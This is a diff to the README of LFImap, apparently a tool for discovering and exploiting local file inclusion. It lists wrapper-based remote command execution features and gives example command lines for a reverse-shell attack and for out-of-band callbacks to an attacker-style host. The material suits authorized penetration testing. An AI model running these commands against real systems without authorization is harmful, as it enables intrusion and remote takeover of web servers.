@@ -1,20 +1,22 @@
 # LFImap
-## Local file inclusion discovery and exploitation tool
+### Local file inclusion discovery and exploitation tool
 
-### Main features
-- Attack with inclusion wrappers
-    - Filter wrapper arbitrary file inclusion
+This project is in pre-alpha stage. Major release 1.0 coming soon with plenty of new abilities and modules.
+
+#### Main features
+- Attack with different modules
+    - Filter wrapper file inclusion
     - Data wrapper remote command execution
     - Input wrapper remote command execution
     - Expect wrapper remote command execution
-    - File wrapper arbitrary file inclusion
-- Attack with path traversal
-- Remote file inclusion
-- Polyglot command injection check
-- Heuristic scans
-    - Polyglot XSS, CRLF checks
-    - Open redirect check
-    - Error-based info leak
+    - File wrapper file inclusion
+    - Attacks with path traversal
+    - Remote file inclusion
+    - Custom polyglot command injection
+    - Heuristic scans
+        - Custom polyglot XSS, CRLF checks
+        - Open redirect check
+        - Error-based file inclusion info leak
 
 - Testing modes
     - -U -> specify single URL to test
@@ -23,21 +25,21 @@
 
 - Full control over the HTTP request
     - Specification of parameters to test (GET, FORM-line, Header, custom injection point)
-    - Specification of custom HTTP headers 
+    - Specification of custom HTTP header(s) 
     - Ability to test with arbitrary form-line (POST) data
     - Ability to test with arbitrary HTTP method
     - Ability to pivot requests through a web proxy
-    - Ability to tune testing with timeout in between requests and maximum response time, before giving up on it
+    - Ability to log all requests and responses to a file
+    - Ability to tune testing with timeout in between requests and maximum response time
     - Support for payload manipulation via url and base64 encoding(s)
-    - Support to output all requests and responses to a file
     - Quick mode (-q), where LFImap uses fewer carefully selected payloads
     - Second order (stored) vulnerability check support
     - Beta/Testing phase CSRF handling support
 
-### Documentation
+#### Documentation
 - [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)
 
-### -h, --help
+#### -h, --help
 
 ```                  
  usage: lfimap.py [-U [url]] [-F [urlfile]] [-R [reqfile]] [-C <cookie>] [-D <data>] [-H <header>]
@@ -114,27 +116,34 @@ OTHER:
 
 ### Examples 
 
-#### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
-`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a`  
+#### 1) Utilize all supported attack modules with '-a'.
+`python3 lfimap.py -U "http://IP/vuln.php?param=testme" -C "PHPSESSID=XXXXXXXX" -a`  
 
-![Lfimap-1](https://user-images.githubusercontent.com/57464251/186299395-c6a91666-0e95-484e-8537-6f248d257f5b.png)
+![LFImap_A](https://github.com/hansmach1ne/LFImap/assets/57464251/7692235a-dfcd-4cab-b0bd-aefdd873cae6)
 
-
-#### 2) Reverse shell command execution attack with '-x'
-`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  
-
-![Lfimap-2](https://user-images.githubusercontent.com/57464251/186299661-7d6b480b-953f-4a7e-a806-5f39435f07fd.png)
-
-
-#### 3) Post argument testing with '-D'
+#### 2) Post argument testing with '-D'
 
 `python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`
 
-![Lfimap-3](https://user-images.githubusercontent.com/57464251/186302047-0a2e9ab9-e4f0-43bb-b245-0235b6950ea0.png)
+![LFIMAP_POST](https://github.com/hansmach1ne/LFImap/assets/57464251/ebd6b1a4-8990-4a36-b321-871fe9271313)
 
 
-If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
+#### 3) Reverse shell remote command execution attack with '-x'
+`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a-x --lhost <IP> --lport <PORT>`  
+
+![LFIMAP_revshell](https://github.com/hansmach1ne/LFImap/assets/57464251/5d64244c-8a37-4019-bf2f-8fa7eb6bfd69)
+
+
+
+#### 4) Out-of-Band blind vulnerability verbose testing support with '--callback'
+
+`python3 lfimap.py -U "http://IP/index.php?param=testme" -a -v --callback="attacker.oastify.com"`
+
+![LFIMAP_OOB](https://github.com/hansmach1ne/LFImap/assets/57464251/d49d3a80-1c34-49fd-97d8-eb870dae040d)
+
+
+If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it, as soon as I can. <br>
 Pull requests are welcome.
 
-[!] Disclaimer: Lfimap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
+[!] Disclaimer: LFImap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
 not responsible for any misuse and damage caused by using this program.
